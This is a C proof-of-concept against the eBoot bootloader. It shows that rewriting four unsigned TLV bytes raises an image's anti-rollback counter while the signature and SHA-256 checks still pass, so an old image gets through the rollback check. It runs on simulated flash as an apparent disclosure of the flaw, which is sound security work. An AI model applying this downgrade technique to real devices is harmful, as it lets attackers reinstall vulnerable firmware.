/* PoC against unmodified eBoot @ 13a7a02: the anti-rollback counter can be
 * raised without touching any byte the signature or payload hash covers. */
#include "eos_image.h"
#include "eos_image_tlv.h"
#include "eos_rollback.h"
#include "eos_crypto_boot.h"
#include "eos_hal.h"
#include <stdio.h>
#include <string.h>

#define FLASH_SZ (64*1024)
#define SLOT     0x1000u
#define PAY      256u
static uint8_t f[FLASH_SZ];
static uint32_t hw_counter = 9;   /* device floor: only >= 9 may boot */

static int fr(uint32_t a, void *b, size_t l){ if(a+l>FLASH_SZ) return EOS_ERR_FLASH; memcpy(b,&f[a],l); return EOS_OK; }
static int fw_(uint32_t a, const void *b, size_t l){ if(a+l>FLASH_SZ) return EOS_ERR_FLASH; memcpy(&f[a],b,l); return EOS_OK; }
static int fe(uint32_t a, size_t l){ if(a+l>FLASH_SZ) return EOS_ERR_FLASH; memset(&f[a],0xFF,l); return EOS_OK; }
static int mr(uint32_t *v){ *v = hw_counter; return EOS_OK; }
static const eos_board_ops_t ops = { .flash_size=FLASH_SZ, .slot_a_addr=SLOT, .slot_a_size=0x8000,
    .flash_read=fr, .flash_write=fw_, .flash_erase=fe, .monotonic_read=mr };

int main(void)
{
    memset(f, 0xFF, sizeof f);
    eos_hal_init(&ops);

    uint8_t pay[PAY];
    for (unsigned i=0;i<PAY;i++) pay[i]=(uint8_t)(i*7+1);

    eos_image_header_t h; memset(&h,0,sizeof h);
    h.magic=EOS_IMG_MAGIC; h.hdr_version=EOS_IMAGE_HDR_VERSION;
    h.hdr_size=sizeof h; h.image_size=PAY;
    h.image_version=0x00010000; h.flags=EOS_IMG_FLAG_HASH_SHA256;
    eos_sha256(pay,PAY,h.hash); h.sig_type=EOS_SIG_ED25519; h.sig_len=EOS_SIG_MAX_SIZE;

    /* TLV after the payload declaring security counter 3 (an OLD image). */
    uint32_t tlv_at = SLOT + sizeof h + PAY;
    eos_tlv_info_t info = { EOS_TLV_INFO_MAGIC, 12 };
    eos_tlv_entry_hdr_t e = { EOS_TLV_MIN_SEC_VER, 4 };
    uint32_t sec = 3;
    memcpy(&f[SLOT],&h,sizeof h);
    memcpy(&f[SLOT+sizeof h],pay,PAY);
    memcpy(&f[tlv_at],&info,4); memcpy(&f[tlv_at+4],&e,4); memcpy(&f[tlv_at+8],&sec,4);

    uint8_t hdr_snapshot[sizeof h];
    memcpy(hdr_snapshot, &f[SLOT], sizeof h);

    uint32_t c=0;
    printf("device anti-rollback floor      : %u\n", hw_counter);
    int rc0 = eos_rollback_read_image_counter(SLOT,&c);
    printf("read_image_counter (untampered) : rc=%d counter=%u\n", rc0, c);
    int v0 = eos_rollback_verify(c);
    printf("rollback_verify(%u)              : %d  (%s)\n", c, v0,
           v0==EOS_OK ? "ACCEPTED" : "rejected, as it should be");

    /* ---- attack: rewrite 4 bytes of the TLV, nothing else ---- */
    uint32_t forged = 9;
    memcpy(&f[tlv_at+8],&forged,4);

    eos_image_header_t ph;
    printf("\nafter rewriting 4 TLV bytes:\n");
    printf("  signed header prefix changed? : %s\n",
           memcmp(hdr_snapshot,&f[SLOT],EOS_IMG_SIGNED_LEN) ? "yes" : "NO");
    printf("  parse_header                  : %d\n", eos_image_parse_header(SLOT,&ph));
    int iv = eos_image_verify_integrity(&ph,SLOT);
    printf("  verify_integrity (SHA-256)    : %d  (%s)\n", iv,
           iv==EOS_OK ? "still PASSES" : "fails");
    c=0;
    int rc = eos_rollback_read_image_counter(SLOT,&c);
    printf("  read_image_counter            : rc=%d counter=%u\n", rc, c);
    int v1 = eos_rollback_verify(c);
    printf("  rollback_verify(%u)            : %d  (%s)\n", c, v1,
           v1==EOS_OK ? "ACCEPTED -- downgrade succeeded" : "rejected");
    return 0;
}
